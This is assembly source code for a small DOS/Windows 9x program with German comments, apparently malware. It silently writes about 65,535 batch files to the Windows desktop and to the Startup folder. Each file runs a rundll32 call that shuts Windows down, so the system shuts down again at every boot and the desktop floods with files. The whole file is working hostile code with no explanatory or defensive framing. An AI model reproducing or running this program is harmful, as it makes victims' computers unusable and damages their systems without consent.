;gekürzte form von ad65536. ohne meldung und tastenabfrage.

.model tiny
.code
losgehts:
;viele dateien erzeugen
xor cx,cx
mov [offset zlr],cx
los:
mov bx,offset tab
mov al,ch
and al,0f0
shr al,4
xlat
mov [offset dat1+23],al
mov [offset dat2+42],al
mov al,ch
and al,0f
xlat
mov [offset dat1+24],al
mov [offset dat2+43],al
mov al,cl
and al,0f0
shr al,4
xlat
mov [offset dat1+25],al
mov [offset dat2+44],al
mov al,cl
and al,0f
xlat
mov [offset dat1+26],al
mov [offset dat2+45],al
;datei1 öffnen
mov ax,03c00
xor cx,cx
mov dx,offset dat1
int 021
;datei1 schreiben
mov bx,ax
mov ax,04000
mov cx,55
mov dx,offset txt
int 021
;datei1 schliessen
mov ax,03e00
int 021
;datei2 öffnen
mov ax,03c00
xor cx,cx
mov dx,offset dat2
int 021
;datei2 schreiben
mov bx,ax
mov ax,04000
mov cx,55
mov dx,offset txt
int 021
;datei2 schliessen
mov ax,03e00
int 021
mov cx,[offset zlr]
inc cx
mov [offset zlr],cx
cmp cx,0ffff
jne los
;ende
mov ax,4c00h
int 21h

.data
tab:	db "0123456789ABCDEF"
dat1:	db "C:\WINDOWS\DESKTOP\nett0000.bat",0
dat2:	db "C:\WINDOWS\STARTM~1\PROGRA~1\AUTOST~1\nett0000.bat",0
txt:	db "echo off",13,10,"cls",13,10,"C:\WINDOWS\rundll32.exe USER,EXITWINDOWS"
zlr:	dw 0

end